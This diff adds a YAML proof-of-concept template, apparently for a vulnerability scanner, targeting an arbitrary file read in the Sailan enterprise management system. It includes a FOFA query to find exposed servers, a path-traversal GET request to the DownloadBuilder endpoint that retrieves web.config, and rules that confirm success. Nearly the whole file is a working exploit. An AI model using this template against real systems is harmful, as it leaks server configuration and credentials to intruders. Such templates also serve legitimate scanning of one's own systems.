@@ -1,0 +1,16 @@
+id: poc-yaml-enterprise-management-system-downloadbuilder-anyfile-read
+info:
+  name: 赛蓝企业管理系统 DownloadBuilder 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 企业管理系统
+  fofa: body="www.cailsoft.com" || body="赛蓝企业管理系统"
+requests:
+- method: GET
+  path: /BaseModule/ReportManage/DownloadBuilder?filename=/../web.config
+  expression: "status_code == 200 && \ncontains(body,\"<configuration>\") &&\ncontains(content_type,\"\
+    application/zip-x-compressed\") &&\ncontains(headers,\"attachment; filename=\\\
+    \"/../web.config\\\"\")\n"
+variables: {}
+transport: http
